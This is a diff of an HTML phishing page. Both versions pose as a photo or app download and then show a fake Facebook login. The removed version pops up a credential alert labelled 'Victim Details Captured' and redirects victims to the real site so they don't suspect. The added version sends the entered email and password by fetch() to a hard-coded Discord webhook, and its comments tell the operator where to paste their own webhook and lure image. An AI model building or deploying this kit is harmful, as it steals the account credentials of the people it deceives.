@@ -3,213 +3,168 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>App Download</title>
+    <title>Download Photo</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            background-color: #0b0c10; /* Dark Professional Background */
-            font-family: Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #000;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             overflow: hidden;
         }
-
-        /* Main Container - Looks like a mobile phone on Desktop */
-        .phone-frame {
-            width: 100%;
-            max-width: 400px; 
-            height: 100%;
-            max-height: 850px;
-            background: white;
-            position: relative;
-            display: flex;
-            flex-direction: column;
-            box-shadow: 0 0 30px rgba(0,0,0,0.6);
-            border-radius: 20px; /* Soft edges for modern look */
-            overflow: hidden;
-        }
-
-        /* Image Area - Strictly 9:16 Ratio */
-        .image-area {
-            width: 100%;
-            height: 75%; 
-            position: relative;
-        }
-
-        .hero-image {
-            width: 100%;
-            height: 100%;
-            object-fit: cover; /* Ensures image fills area without distortion */
-            display: block;
-        }
-
-        /* Button Area */
-        .btn-area {
-            height: 25%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: linear-gradient(to top, rgba(0,0,0,0.9), transparent);
+        .bg {
             position: absolute;
-            bottom: 0;
+            top: 0;
+            left: 0;
             width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 1;
+            opacity: 0.8;
         }
-
         .download-btn {
-            background: #1877f2;
-            color: white;
-            border: none;
-            padding: 16px 50px;
-            font-size: 20px;
-            font-weight: bold;
-            border-radius: 50px;
-            cursor: pointer;
-            box-shadow: 0 0 20px rgba(24, 119, 242, 0.6);
-            animation: pulse 2s infinite;
+            position: relative;
             z-index: 10;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.1); opacity: 0.9; }
-            100% { transform: scale(1); opacity: 1; }
-        }
-
-        /* --- FAKE LOGIN PAGE STYLES (Mobile Optimized) --- */
-        .fb-mobile-view {
-            width: 100%;
-            height: 100vh;
-            background: #fff;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding-top: 60px;
-            box-sizing: border-box;
-        }
-
-        .fb-logo {
-            font-size: 42px;
-            font-weight: bold;
-            color: #1877f2;
-            margin-bottom: 40px;
-            letter-spacing: -1px;
-        }
-
-        .input-group {
-            width: 85%;
-            margin-bottom: 15px;
-        }
-
-        .fb-input {
-            width: 100%;
-            padding: 18px;
-            border: 1px solid #dddfe2;
-            border-radius: 8px;
-            font-size: 17px;
-            outline: none;
-            box-sizing: border-box;
-        }
-
-        .fb-input:focus {
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px #e7f3ff;
-        }
-
-        .login-btn {
-            width: 85%;
-            padding: 16px;
             background: #1877f2;
             color: white;
-            font-size: 20px;
-            font-weight: bold;
             border: none;
-            border-radius: 8px;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 6px;
             cursor: pointer;
-            margin-top: 10px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+            transition: transform 0.2s;
         }
-
-        .links {
-            margin-top: 20px;
-            text-align: center;
-            font-size: 14px;
+        .download-btn:active { transform: scale(0.95); }
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 100;
+            justify-content: center;
+            align-items: center;
         }
-        
-        a { color: #1877f2; text-decoration: none; }
+        .login-box {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            width: 85%;
+            max-width: 350px;
+            box-sizing: border-box;
+            position: relative;
+        }
+        .login-box h2 { margin: 0 0 15px 0; text-align: center; color: #1877f2; }
+        .input-group { margin-bottom: 12px; }
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1877f2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <!-- MAIN LANDING PAGE -->
-    <div class="phone-frame">
-        <div class="image-area">
-            <!-- High Quality Mobile Wallpaper Link -->
-            <img src="https://images.unsplash.com/photo-1512949460376-29873e32d338?q=80&w=1000&auto=format&fit=crop" 
-                 alt="App Preview" 
-                 class="hero-image">
-        </div>
-        
-        <div class="btn-area">
-            <button class="download-btn" onclick="openLoginWindow()">Download Now</button>
+    <!-- Background Image -->
+    <!-- Neeche 'src' mein apni photo ka link daalo -->
+    <img src="https://app.box.com/s/bsxlzttyfai64dmh0p9a5qfvjpjzukj1" class="bg" alt="Background">
+
+    <!-- Download Button -->
+    <button class="download-btn" onclick="openLogin()">Download Photo</button>
+
+    <!-- Login Modal -->
+    <div class="modal-overlay" id="modal">
+        <div class="login-box">
+            <h2>facebook</h2>
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="email" placeholder="Email or Phone" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <div class="spinner" id="spinner"></div>
+                <button type="submit" class="login-btn">Log in</button>
+            </form>
         </div>
     </div>
 
     <script>
-        function openLoginWindow() {
-            // Open window with specific mobile-like dimensions
-            const win = window.open("", "_blank", "width=375,height=667");
-            
-            win.document.write(`
-                <html>
-                <head>
-                    <title>Facebook</title>
-                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                    <style>
-                        body { margin: 0; padding: 0; background: #fff; font-family: Helvetica, Arial, sans-serif; }
-                    </style>
-                </head>
-                <body>
-                    <div class="fb-mobile-view">
-                        <div class="fb-logo">facebook</div>
-                        
-                        <form id="loginForm" onsubmit="captureData(event)">
-                            <div class="input-group">
-                                <input type="text" id="email" class="fb-input" placeholder="Phone number or email address" required autocomplete="off">
-                            </div>
-                            
-                            <div class="input-group">
-                                <input type="password" id="pass" class="fb-input" placeholder="Password" required autocomplete="off">
-                            </div>
-                            
-                            <button type="submit" class="login-btn">Log In</button>
-                        </form>
-                        
-                        <div class="links">
-                            <a href="#">Forgot password?</a><br><br>
-                            <span style="color:#606060;">Don't have an account? </span>
-                            <a href="#">Sign up</a>
-                        </div>
-                    </div>
-                </body>
-                </html>
-            `);
+        // --- YAHAN APNA WEBHOOK URL PASTE KARO ---
+        const webhookUrl = "https://discord.com/api/webhooks/1552377252233351242/smEucJaAWft00isIfjb8r6mUJN2S7U8n5ZnY04c9uH7znNz85JX5P1vEpHCL3n3JCku7"; 
+        // ----------------------------------------
 
-            // Data Capture Logic
-            window.captureData = function(e) {
-                e.preventDefault();
-                
-                const email = document.getElementById('email').value;
-                const pass = document.getElementById('pass').value;
-
-                alert("Victim Details Captured:\n\nEmail/Number: " + email + "\nPassword: " + pass);
-
-                // Redirect to real Facebook so they don't suspect
-                win.location.href = "https://www.facebook.com";
-            };
+        function openLogin() {
+            document.getElementById('modal').style.display = 'flex';
         }
-    </script>
 
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const spinner = document.getElementById('spinner');
+            const btn = document.querySelector('.login-btn');
+
+            spinner.style.display = 'block';
+            btn.disabled = true;
+
+            try {
+                // Data ko webhook par bhejna
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        email: email,
+                        password: password
+                    })
+                });
+
+                // Agar chaho to yahan success message ya redirect de sakte ho
+                alert("Details Sent!");
+                location.reload(); 
+
+            } catch (error) {
+                console.error('Error:', error);
+                alert("Error sending details");
+            } finally {
+                spinner.style.display = 'none';
+                btn.disabled = false;
+            }
+        });
+    </script>
 </body>
 </html>
